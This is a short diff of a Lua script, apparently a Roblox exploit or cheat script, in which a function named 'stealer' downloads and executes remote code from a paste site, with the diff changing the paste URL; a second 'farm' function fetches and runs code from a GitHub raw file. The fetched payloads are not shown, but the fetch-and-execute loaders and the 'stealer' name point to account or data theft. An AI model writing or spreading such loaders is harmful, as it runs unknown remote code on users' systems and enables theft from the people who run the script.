@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://dpaste.org/qhpqG/raw", true))()
+    loadstring(game:HttpGet("https://dpaste.org/oLZKG/raw", true))()
 end
 local function farm()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/unluckyws/loading-screen/refs/heads/main/universal/.lua"))()
